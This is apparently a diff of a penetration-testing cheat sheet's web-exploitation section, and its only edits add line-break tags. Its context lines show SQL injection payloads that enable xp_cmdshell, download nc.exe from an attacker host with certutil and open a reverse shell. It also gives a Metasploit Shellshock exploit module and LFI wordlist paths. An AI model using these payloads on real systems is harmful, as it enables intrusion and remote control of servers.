@@ -284,7 +284,7 @@ Web Exploitation
          ' EXEC sp_configure 'xp_cmdshell', 1--
          ' reconfigure--
          ' EXEC xp_cmdshell 'certutil -urlcache -f http://<LHOST>:<LPORT>/nc.exe nc.exe'--
-         ' EXEC xp_cmdshell "nc.exe -e cmd.exe <LHOST> <LPORT>";--
+         ' EXEC xp_cmdshell "nc.exe -e cmd.exe <LHOST> <LPORT>";--<br>
          
 `LFI/RFI`
 
@@ -300,7 +300,7 @@ Web Exploitation
 -    Wordlists  
 
          /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
-         /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt
+         /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt<br>
          
 `CGI-BIN`
 
@@ -313,7 +313,7 @@ Web Exploitation
      `auxiliary/scanner/http/apache_mod_cgi_bash_env`
      
 -    MSF Exploit  
-     `exploit/multi/http/apache_mod_cgi_bash_env_exec`
+     `exploit/multi/http/apache_mod_cgi_bash_env_exec`<br>
 
 `XSS`
 
@@ -327,7 +327,7 @@ Web Exploitation
 
 ![SSTI](https://github.com/seal9055/Docs/blob/main/SSTI.png?raw=true)
 
-
+<br>
 `CMS`
 
 -    WORDPRESS  
@@ -335,3 +335,4 @@ Web Exploitation
      
 -    MAGENTO  
      [Magescan](https://github.com/steverobbins/magescan)
+<br>
